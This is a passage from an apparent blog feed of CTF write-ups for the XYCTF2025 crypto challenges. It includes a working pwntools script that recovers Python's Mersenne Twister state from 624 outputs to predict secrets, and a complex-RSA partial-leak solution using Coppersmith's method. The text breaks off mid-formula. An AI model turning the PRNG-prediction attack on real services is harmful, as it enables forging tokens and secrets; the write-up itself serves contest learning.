b&#x27;&quot;\xf2Y\xf0\x15\xc5x\x94\xb9E\xbd\xd3\xa7\xb1\xad\x00\xa2D*+\x87BQ_20\x87\xa2\nP\xfc\xce\x0eW\xaf\xd8-.\xb5\xfai\xf1\xf6*\xben^\xd5&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="reference"><a class="markdownIt-Anchor" href="#reference"></a> reference</h1><ul><li><a href="https://blog.xmcve.com/2025/04/27/ACTF2025-Writeup">星盟</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;misc&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#misc&quot;&gt;&lt;/a&gt; Misc&lt;/h1&gt;
&lt;h2 id=&quot;signin&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#signin&quot;&gt;&lt;/a&gt; sign</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>XYCTF2025-WriteUp</title>
    <link href="https://hvang10.github.io/2025/04/08/XYCTF2025-WriteUp/"/>
    <id>https://hvang10.github.io/2025/04/08/XYCTF2025-WriteUp/</id>
    <published>2025-04-07T19:19:43.000Z</published>
    <updated>2025-04-07T19:57:44.085Z</updated>
    
    <content type="html"><![CDATA[<p>*<strong>代表未解决，可能是卡了，也可能是没思路了，简单做个记录，然后跑了，再或者是后续没来得及复现，在此处留个坑，等以后回来填上……</strong></p><p><a href="https://gz.imxbt.cn/games/23">复现网址</a></p><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="division"><a class="markdownIt-Anchor" href="#division"></a> Division</h2><blockquote><p>LamentXU学不明白除法了，能教教我吗？（adwa这个骗人的大坏蛋&gt;_&lt;，这个才是签到啊）</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   server.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/20 12:25:03</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;----Welcome to my division calc----&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">menu:</span></span><br><span class="line"><span class="string">      [1]  Division calc</span></span><br><span class="line"><span class="string">      [2]  Get flag</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    choose = <span class="built_in">input</span>(<span class="string">&#x27;: &gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> choose == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            denominator = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;input the denominator: &gt;&gt;&gt; &#x27;</span>))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;INPUT NUMBERS&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        nominator = random.getrandbits(<span class="number">32</span>)</span><br><span class="line">        <span class="keyword">if</span> denominator == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;NO YOU DONT&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;nominator&#125;</span>//<span class="subst">&#123;denominator&#125;</span> = <span class="subst">&#123;nominator//denominator&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> choose == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ans = <span class="built_in">input</span>(<span class="string">&#x27;input the answer: &gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">            rand1 = random.getrandbits(<span class="number">11000</span>)</span><br><span class="line">            rand2 = random.getrandbits(<span class="number">10000</span>)</span><br><span class="line">            correct_ans = rand1 // rand2</span><br><span class="line">            <span class="keyword">if</span> correct_ans == <span class="built_in">int</span>(ans):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;WOW&#x27;</span>)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&#x27;Here is your flag: <span class="subst">&#123;f.read()&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;NOPE, the correct answer is <span class="subst">&#123;correct_ans&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;INPUT NUMBERS&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Invalid choice&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>MT19937</strong>，令<strong>分母</strong>为1，连续获得<strong>624轮随机数</strong>，再预测<code>rand1 rand2</code>即可得到<code>flag</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;47.94.15.198&quot;</span>, <span class="number">20491</span>)</span><br><span class="line">rc = RandCrack()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">624</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    a = <span class="built_in">str</span>(p.recvline().decode()).split(<span class="string">&#x27; = &#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">    rc.submit(<span class="built_in">int</span>(a))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;: &gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;: &gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">rand1 = rc.predict_getrandbits(<span class="number">11000</span>)</span><br><span class="line">rand2 = rc.predict_getrandbits(<span class="number">10000</span>)</span><br><span class="line">ans = rand1 // rand2</span><br><span class="line">p.sendline(<span class="built_in">str</span>(ans))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Here is your flag: &#x27;</span>)</span><br><span class="line">flag = p.recvline()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://picx.zhimg.com/80/v2-1364b443a5f502f55274afa666827bdd_1440w.png?source=d16d100b" alt="" /></p><h2 id="complex_signin"><a class="markdownIt-Anchor" href="#complex_signin"></a> Complex_signin</h2><blockquote><p>As everyone knows, a check-in challenge shouldn’t look too much like a check-in. So, this is a simple partial m leakage in RSA—but then again, it doesn’t seem like just a simple partial m leakage in RSA.</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ChaCha20</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Complex</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, re, im</span>):</span><br><span class="line">        self.re = re</span><br><span class="line">        self.im = im</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self, c</span>):</span><br><span class="line">        re_ = self.re * c.re - self.im * c.im</span><br><span class="line">        im_ = self.re * c.im + self.im * c.re</span><br><span class="line">        <span class="keyword">return</span> Complex(re_, im_)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, c</span>):</span><br><span class="line">        <span class="keyword">return</span> self.re == c.re <span class="keyword">and</span> self.im == c.im</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__rshift__</span>(<span class="params">self, m</span>):</span><br><span class="line">        <span class="keyword">return</span> Complex(self.re &gt;&gt; m, self.im &gt;&gt; m)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__lshift__</span>(<span class="params">self, m</span>):</span><br><span class="line">        <span class="keyword">return</span> Complex(self.re &lt;&lt; m, self.im &lt;&lt; m)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.im == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">str</span>(self.re)</span><br><span class="line">        <span class="keyword">elif</span> self.re == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">abs</span>(self.im) == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;<span class="string">&#x27;-&#x27;</span> <span class="keyword">if</span> self.im &lt; <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span>&#125;</span>i&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;self.im&#125;</span>i&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;self.re&#125;</span> <span class="subst">&#123;<span class="string">&#x27;+&#x27;</span> <span class="keyword">if</span> self.im &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;-&#x27;</span>&#125;</span> <span class="subst">&#123;<span class="built_in">abs</span>(self.im)&#125;</span>i&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">tolist</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> [self.re, self.im]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">complex_pow</span>(<span class="params">c, exp, n</span>):</span><br><span class="line">    result = Complex(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">while</span> exp &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> exp &amp; <span class="number">1</span>:</span><br><span class="line">            result = result * c</span><br><span class="line">            result.re = result.re % n</span><br><span class="line">            result.im = result.im % n</span><br><span class="line">        c = c * c</span><br><span class="line">        c.re = c.re % n</span><br><span class="line">        c.im = c.im % n</span><br><span class="line">        exp &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">bits = <span class="number">128</span></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">m = Complex(getRandomRange(<span class="number">1</span>, n), getRandomRange(<span class="number">1</span>, n))</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = complex_pow(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;mh = <span class="subst">&#123;(m &gt;&gt; bits &lt;&lt; bits).tolist()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;C = <span class="subst">&#123;c.tolist()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;enc = <span class="subst">&#123;ChaCha20.new(key=hashlib.sha256(<span class="built_in">str</span>(m.re + m.im).encode()).digest(), nonce=<span class="string">b&#x27;Pr3d1ctmyxjj&#x27;</span>).encrypt(flag)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 24240993137357567658677097076762157882987659874601064738608971893024559525024581362454897599976003248892339463673241756118600994494150721789525924054960470762499808771760690211841936903839232109208099640507210141111314563007924046946402216384360405445595854947145800754365717704762310092558089455516189533635318084532202438477871458797287721022389909953190113597425964395222426700352859740293834121123138183367554858896124509695602915312917886769066254219381427385100688110915129283949340133524365403188753735534290512113201932620106585043122707355381551006014647469884010069878477179147719913280272028376706421104753</span></span><br><span class="line"><span class="string">mh = [3960604425233637243960750976884707892473356737965752732899783806146911898367312949419828751012380013933993271701949681295313483782313836179989146607655230162315784541236731368582965456428944524621026385297377746108440938677401125816586119588080150103855075450874206012903009942468340296995700270449643148025957527925452034647677446705198250167222150181312718642480834399766134519333316989347221448685711220842032010517045985044813674426104295710015607450682205211098779229647334749706043180512861889295899050427257721209370423421046811102682648967375219936664246584194224745761842962418864084904820764122207293014016, 15053801146135239412812153100772352976861411085516247673065559201085791622602365389885455357620354025972053252939439247746724492130435830816513505615952791448705492885525709421224584364037704802923497222819113629874137050874966691886390837364018702981146413066712287361010611405028353728676772998972695270707666289161746024725705731676511793934556785324668045957177856807914741189938780850108643929261692799397326838812262009873072175627051209104209229233754715491428364039564130435227582042666464866336424773552304555244949976525797616679252470574006820212465924134763386213550360175810288209936288398862565142167552]</span></span><br><span class="line"><span class="string">C = [5300743174999795329371527870190100703154639960450575575101738225528814331152637733729613419201898994386548816504858409726318742419169717222702404409496156167283354163362729304279553214510160589336672463972767842604886866159600567533436626931810981418193227593758688610512556391129176234307448758534506432755113432411099690991453452199653214054901093242337700880661006486138424743085527911347931571730473582051987520447237586885119205422668971876488684708196255266536680083835972668749902212285032756286424244284136941767752754078598830317271949981378674176685159516777247305970365843616105513456452993199192823148760, 21112179095014976702043514329117175747825140730885731533311755299178008997398851800028751416090265195760178867626233456642594578588007570838933135396672730765007160135908314028300141127837769297682479678972455077606519053977383739500664851033908924293990399261838079993207621314584108891814038236135637105408310569002463379136544773406496600396931819980400197333039720344346032547489037834427091233045574086625061748398991041014394602237400713218611015436866842699640680804906008370869021545517947588322083793581852529192500912579560094015867120212711242523672548392160514345774299568940390940653232489808850407256752]</span></span><br><span class="line"><span class="string">enc = b&#x27;\x9c\xc4n\x8dF\xd9\x9e\xf4\x05\x82!\xde\xfe\x012$\xd0\x8c\xaf\xfb\rEb(\x04)\xa1\xa6\xbaI2J\xd2\xb2\x898\x11\xe6x\xa9\x19\x00pn\xf6rs- \xd2\xd1\xbe\xc7\xf51.\xd4\xd2 \xe7\xc6\xca\xe5\x19\xbe&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>复数域</strong>下的<strong>明文高位泄露</strong>，<a href="https://tangcuxiaojikuai.xyz/post/146254b2.html">去年</a>就开始玩复数了，这里的话可以打<strong>二元copper</strong>，这里也是直接套用<strong>小鸡块师傅</strong>的脚本，其实跟一元相差不大</p><p><code>bound</code>为两个根的上界，<code>m</code>为移位，<code>d</code>为多项式中的最高幂</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mo>≡</mo><mo stretchy="false">(</mo><mi>m</mi><mi mathvariant="normal">_</mi><mi>r</mi><mi>e</mi><mo>+</mo><mi>m</mi><mi mathvariant="normal">_</mi><mi>i</mi><mi>m</mi><mo>∗</mo><mi>i</mi><msup><mo stretchy="false">)</mo><mn>3</mn></msup><mi mathvariant="normal">%</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">C\equiv(m\_re+m\_im*i)^{3}\%n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9695199999999999em;vertical-align:-0.31em;"></span><span class="mord mathnormal">m</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal">i</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span><span class="mord">%</span><span class="mord mathnormal">n</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi mathvariant="normal">_</mi><mi>r</mi><mi>e</mi><mo>=</mo><mi>m</mi><mi>h</mi><mi mathvariant="normal">_</mi><mi>r</mi><mi>e</mi><mo>+</mo><mi>x</mi></mrow><annotation encoding="application/x-tex">m\_re=mh\_re+x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.74056em;vertical-align:-0.31em;"></span><span class="mord mathnormal">m</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">h</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi mathvariant="normal">_</mi><mi>i</mi><mi>m</mi><mo>=</mo><mi>m</mi><mi>h</mi><mi mathvariant="normal">_</mi><mi>i</mi><mi>m</mi><mo>+</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">m\_im=mh\_im+y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9695199999999999em;vertical-align:-0.31em;"></span><span class="mord mathnormal">m</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">h</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi mathvariant="normal">_</mi><mi>r</mi><mi>e</mi><mo>≡</mo><mo stretchy="false">(</mo><mi>m</mi><mi>h</mi><mi mathvariant="normal">_</mi><mi>r</mi><mi>e</mi><mo>+</mo><mi>x</mi><msup><mo stretchy="false">)</mo><mn>3</mn></msup><mo>−</mo><mn>3</mn><mo>∗</mo><mo stretchy="false">(</mo><mi>m</mi><mi>h</mi><mi mathvariant="normal">_</mi><mi>r</mi><mi>e</mi><mo>+</mo><mi>x</mi><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><mi>m</mi><mi>h</mi><mi mathvariant="normal">_</mi><mi>i</mi><mi>m</mi><mo>+</mo><mi>y</mi><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mi mathvariant="normal">%</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">C\_re\equiv(mh\_re+x)^{3}-3*(mh\_re+x)*(mh\_im+y)^{2}\%n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.99333em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">h</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">h</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">h</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mord">%</span><span class="mord mathnormal">n</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi mathvariant="normal">_</mi><mi>i</mi><mi>m</mi><mo>≡</mo><mn>3</mn><mo>∗</mo><mo stretchy="false">(</mo><mi>m</mi><mi>h</mi><mi mathvariant="normal">_</mi><mi>r</mi><mi>e</mi><mo>+</mo><mi>x</mi><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo>∗</mo><mo stretchy="false">(</mo><mi>m</mi><mi>h</mi><mi mathvariant="normal">_</mi><mi>i</mi><mi>m</mi><mo>+</mo><mi>y</mi><mo stretchy="false">)</mo><mo>−</mo><mo stretchy="false">(</mo><mi>m</mi><mi>h</mi><mi mathvariant="normal">_</mi><mi>i</mi><mi>m</mi><mo>+</mo><mi>x</mi><msup><mo stretchy="false">)</mo><mn>3</mn></msup><mi mathvariant="normal">%</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">C\_im\equiv3*(mh\_re+x)^{2}*(mh\_im+y)-(mh\_im+x)^{3}\%n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.99333em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">h</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">h</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">h</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span><span class="mord">%</span><span class="mord 